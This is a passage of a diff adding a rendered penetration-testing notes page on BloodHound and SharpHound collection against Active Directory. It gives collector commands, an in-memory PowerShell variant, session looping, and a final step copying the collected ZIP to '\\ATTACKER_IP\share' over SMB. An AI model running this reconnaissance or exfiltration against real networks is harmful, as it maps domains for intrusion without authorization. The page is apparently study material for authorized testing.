+<td><code>LocalAdmin</code></td>
+<td>Local admin relationships.</td>
+</tr>
+<tr>
+<td><code>Session</code></td>
+<td>User sessions.</td>
+</tr>
+<tr>
+<td><code>Trusts</code></td>
+<td>Domain trusts.</td>
+</tr>
+<tr>
+<td><code>ACL</code></td>
+<td>AD object permissions.</td>
+</tr>
+<tr>
+<td><code>ObjectProps</code></td>
+<td>Object properties.</td>
+</tr>
+<tr>
+<td><code>Container</code></td>
+<td>OU/container relationships.</td>
+</tr>
+<tr>
+<td><code>All</code></td>
+<td>Broad collection.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>When to use BloodHound collection</strong></p>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>New valid domain user</td>
+<td>Initial graph collection.</td>
+</tr>
+<tr>
+<td>Need group nesting clarity</td>
+<td>Group collection.</td>
+</tr>
+<tr>
+<td>Looking for ACL paths</td>
+<td>ACL collection.</td>
+</tr>
+<tr>
+<td>Hunting sessions</td>
+<td>Session collection.</td>
+</tr>
+<tr>
+<td>Multi-domain environment</td>
+<td>Trust collection.</td>
+</tr>
+<tr>
+<td>Need broad lab data</td>
+<td>All collection.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Import</strong></p>
+<p>BloodHound CE usually imports ZIP files produced by collectors.</p>
+<p>Keep collection output organized:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>bh/<span class="nv">$DOMAIN</span>
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>mv<span class="w"> </span>*.json<span class="w"> </span>*.zip<span class="w"> </span>bh/<span class="nv">$DOMAIN</span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<hr />
+<h2 id="sharphound-collection">SharpHound Collection</h2>
+<p>SharpHound is the official Windows collector for BloodHound CE.</p>
+<p>It is commonly used when running collection from a domain-joined Windows host.</p>
+<p><strong>Basic SharpHound usage</strong></p>
+<p>From PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span>
+</span></code></pre></div>
+<p>Specify domain:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+<p>Specify domain controller:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-domaincontroller</span> <span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+<p>Output directory:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span> <span class="p">-</span><span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span>
+</span></code></pre></div>
+<p>Zip output is created by default in many SharpHound builds.</p>
+<p><strong>Common collection methods</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="k">Default</span>
+</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="nb">Group</span>
+</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">Session</span>
+</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">LocalAdmin</span>
+</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">ACL</span>
+</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">Trusts</span>
+</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">ObjectProps</span>
+</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#__codelineno-126-8"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">Container</span>
+</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#__codelineno-126-9"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span>
+</span></code></pre></div>
+<p>Combined methods:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">Group</span><span class="p">,</span><span class="n">LocalAdmin</span><span class="p">,</span><span class="n">Session</span><span class="p">,</span><span class="n">Trusts</span><span class="p">,</span><span class="n">ACL</span><span class="p">,</span><span class="n">ObjectProps</span>
+</span></code></pre></div>
+<p>Stealthier style collection depends on scope and rules of engagement. In labs, <code>All</code> is usually acceptable.</p>
+<p><strong>Run from memory</strong></p>
+<p>If the environment allows PowerShell loading:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#__codelineno-128-2"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span>
+</span></code></pre></div>
+<p>Specify output:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span>
+</span></code></pre></div>
+<p><strong>Useful options</strong></p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-c</code> / <code>--collectionmethods</code></td>
+<td>Select collection methods.</td>
+</tr>
+<tr>
+<td><code>-d</code> / <code>--domain</code></td>
+<td>Specify domain.</td>
+</tr>
+<tr>
+<td><code>--domaincontroller</code></td>
+<td>Use specific DC.</td>
+</tr>
+<tr>
+<td><code>--OutputDirectory</code></td>
+<td>Where to write output.</td>
+</tr>
+<tr>
+<td><code>--ZipFileName</code></td>
+<td>Name output ZIP.</td>
+</tr>
+<tr>
+<td><code>--NoSaveCache</code></td>
+<td>Avoid saving cache.</td>
+</tr>
+<tr>
+<td><code>--Loop</code></td>
+<td>Repeated session collection.</td>
+</tr>
+<tr>
+<td><code>--LoopDuration</code></td>
+<td>Loop duration.</td>
+</tr>
+<tr>
+<td><code>--LoopInterval</code></td>
+<td>Delay between loop iterations.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Session loop example</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">Session</span> <span class="p">-</span><span class="n">-Loop</span> <span class="p">-</span><span class="n">-LoopDuration</span> <span class="n">01</span><span class="p">:</span><span class="n">00</span><span class="p">:</span><span class="n">00</span> <span class="p">-</span><span class="n">-LoopInterval</span> <span class="n">00</span><span class="p">:</span><span class="n">05</span><span class="p">:</span><span class="n">00</span>
+</span></code></pre></div>
+<p>Use looping only when allowed, because it increases collection activity.</p>
+<p><strong>Copy output</strong></p>
+<p>Example output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>20260101120000_BloodHound.zip
+</span></code></pre></div>
+<p>Copy from Windows host:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a><span class="nb">copy </span><span class="p">.\*</span><span class="n">_BloodHound</span><span class="p">.</span><span class="n">zip</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span>
+</span></code></pre></div>
+<p>If SMB is available from attacker box:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>smbserver.py<span class="w"> </span>share<span class="w"> </span>.<span class="w"> </span>-smb2support
+</span></code></pre></div>
+<p>Then from Windows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>copy *_BloodHound.zip \\ATTACKER_IP\share\
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Unauth_Attacks/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Unauthenticated Attacks">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Unauthenticated Attacks
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Credential_Access/" class="md-footer__link md-footer__link--next" aria-label="Next: Credential Access">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Credential Access
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
